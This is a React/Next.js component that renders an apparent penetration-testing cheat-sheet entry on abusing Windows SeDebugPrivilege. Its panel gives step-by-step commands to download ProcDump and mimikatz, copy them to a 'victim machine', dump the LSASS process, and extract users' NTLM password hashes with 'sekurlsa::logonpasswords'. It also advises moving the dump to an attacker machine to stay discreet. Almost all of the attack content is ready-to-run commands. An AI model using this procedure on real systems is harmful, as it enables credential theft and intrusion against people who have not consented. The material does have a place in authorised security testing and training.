import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const SeDebugPrivilege = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              The SeDebugPrivilege policy setting determines which users can
              attach to or open any process, even a process they do not own.
              Developers who are debugging their applications do not need this
              user right. Developers who are debugging new system components
              need this user right. This user right provides access to sensitive
              and critical operating system components.
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>
              With the SeDebugPrivilege we have privileges to dump process
              memory from any process. We can use ProcDump from the SysInternal
              suite to dump the Local Security Authority Subsytem Service
              (LSASS) process, which stores user credentials after a user logs
              on to a system.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>Download ProcDump</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"wget https://download.sysinternals.com/files/Procdump.zip"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>
              If you need to be discrete, then transfer the LSASS procdump to
              your Attacker machine and use mimikatz locally. If you don't need
              to be discrete then transfer mimikatz to the Victim machine and
              use it there.
            </Typography>
            <Box sx={{ m: 2 }} />
            <Typography>32-bit</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/ParrotSec/mimikatz/blob/master/Win32/mimikatz.exe"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <Typography>64-bit</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/ParrotSec/mimikatz/blob/master/x64/mimikatz.exe"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              Transfer ProcDump and mimikatz to victim machine.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              Run ProcDump on LSASS. Process dump is saved to a file called
              `lsass.dmp`
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"procdump.exe -accepteula -ma lsass.exe lsass.dmp"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 5</Typography>
            <Typography>
              Run mimikatz to extract logon passwords from LSASS
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"mimikatz.exe"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"mimikatz # log"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"mimikatz # sekurlsa::minidump lsass.dmp"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"mimikatz # sekurlsa::logonpasswords"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 6</Typography>
            <Typography>
              The output from mimikatz should give you the NTLM password hash of
              users in the LSASS memory.
            </Typography>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SeDebugPrivilege;
